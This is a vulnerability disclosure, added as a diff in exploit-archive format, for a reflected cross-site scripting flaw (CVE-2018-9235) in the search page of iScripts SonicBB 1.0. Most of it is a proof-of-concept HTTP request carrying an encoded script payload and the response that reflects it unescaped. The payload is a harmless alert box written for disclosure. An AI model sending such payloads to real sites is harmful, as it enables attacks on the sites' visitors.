@@ -1,0 +1,65 @@
+# Exploit Title: iScripts SonicBB 1.0 - Reflected Cross-Site Scripting
+# Date: 02/04/2018
+# Exploit Author: ManhNho
+# Vendor Homepage: https://www.iscripts.com
+# Demo Page: https://www.demo.iscripts.com/sonicbb/demo/
+# Version: 1.0
+# Tested on: Windows 10
+# Category: Webapps
+# CVE: CVE-2018-9235
+
+1. Description
+====================
+iScripts SonicBB 1.0 has Reflected Cross-Site Scripting via the query
+parameter to search.php
+
+2. PoC
+====================
+Request:
+
+GET
+/sonicbb/demo/search.php?query=%22%3E%3Cscript%3Ealert%28%271%27%29%3C%2Fscript%3E
+HTTP/1.1
+Host: www.demo.iscripts.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0)
+Gecko/20100101 Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: __utma=227100805.298811387.1522637403.1522637403.1522637403.1;
+__utmb=227100805; __utmc=227100805;
+__utmz=227100805.1522637403.1.1.utmccn=(direct)|utmcsr=(direct)|utmcmd=(none);
+PHPSESSID=grh7l3amrvhoapig8ll268l9o4;
+messagesUtk=9ae2fcc5306f4d9c8d433f0f58efb968; hs-messages-is-open=false
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Mon, 02 Apr 2018 02:58:48 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Connection: close
+Content-Type: text/html
+Content-Length: 3619
+...
+    <tr>
+     <td width="76%" class="alt1"><a href="index.php">iScripts Forum</a> ->
+<a href="search.php?query="><script>alert('1')</script>">Search</a></td>
+     <td width="24%" align="center" class="alt1">
+      <form method="GET" action="search.php" style="display: inline">
+       <input type="text" name="query" size="12" style="font-size: 10px">
+       <input type="submit" value="Search" style="font-size: 10px">
+      </form>
+     </td>
+    </tr>
+...
+
+3. References
+====================
+https://pastebin.com/caQW37fY
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-9235
